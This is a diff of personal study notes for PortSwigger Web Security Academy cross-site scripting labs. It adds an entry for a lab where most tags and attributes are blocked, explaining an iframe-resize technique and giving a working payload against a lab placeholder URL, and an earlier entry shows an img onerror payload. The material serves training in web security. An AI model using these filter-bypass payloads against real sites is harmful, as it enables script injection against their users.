@@ -8,10 +8,14 @@
 	Method: just insert any scriptable tag
 	Payload: <img/src/onerror=alert()>
 
-------> 
-	Flow:
-	Method:
-	Payload:
+------> Lab: Reflected XSS into HTML context with most tags and attributes blocked
+	Flow: Allows <body> tag and onresize attribute
+	Method: craft an iframe payload and embed it in your server in a way that the ifrmae payload
+		will request the vulnerable page injecting another payload containing <body> tag and
+		onresize attribute. On loading the vulnerable page on your server, the iframe resizes
+		the vulnerable page to execute the payload on the vulnerable page.
+	Payload: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"
+		 onload=this.style.width='100px'>
 
 
 ------> Lab: Reflected XSS with some SVG markup allowed
